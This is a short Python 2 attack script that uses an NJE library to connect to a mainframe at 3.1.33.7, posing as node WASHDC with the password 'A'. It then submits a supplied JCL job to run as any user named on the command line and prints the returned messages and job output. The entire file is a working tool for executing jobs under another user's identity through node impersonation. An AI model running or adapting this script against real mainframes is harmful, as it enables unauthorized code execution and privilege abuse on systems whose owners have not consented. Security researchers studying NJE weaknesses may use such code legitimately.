#!/usr/bin/python
#
# Executes the JCL provided in the first argument
# as the user provided as the second argument
# and displays the information/contents to stdout

# By Philip Young (c) 2016
# MIT License

import njelib
import sys

RHOST = 'WASHDC'
OHOST = 'NEWYORK'

nje = njelib.NJE(RHOST,OHOST)
print "[+] Connecting to 3.1.33.7"
nje.set_debuglevel(1)
t = nje.session(host="3.1.33.7",port=175, timeout=2, password="A")
# Notice the use of the password here to connect.
if not t:
	print "[!] Could not connect"
	sys.exit(1)

print "[+] Connected"
print "==================="
print "[+] Sending file:", sys.argv[1]
with open (sys.argv[1], "r") as myfile:
		    data=myfile.readlines()
print "---------10--------20--------30---------40---------50---------60---------70---------80\n"
for l in data:
    print l.strip("\n")
print "\n---------10--------20--------30---------40---------50---------60---------70---------80"
nje.sendJCL(sys.argv[1], sys.argv[2], "h4ckr")
print "==================="
print "[+] Response Received"
if len(nje.getNMR()) > 0:
    print "[+] NMR Records"

print "==================="
for record in nje.getNMR():
    if 'NMRUSER' in record:
        print "[+] User Message"
        print "[+] To User:", record['NMRUSER']
        print "[+] Message:", record['NMRMSG']

print "==================="
print "[+] Records in SYSOUT:"
for record in nje.getSYSOUT():
    if 'Record' in record:
        print record['Record']
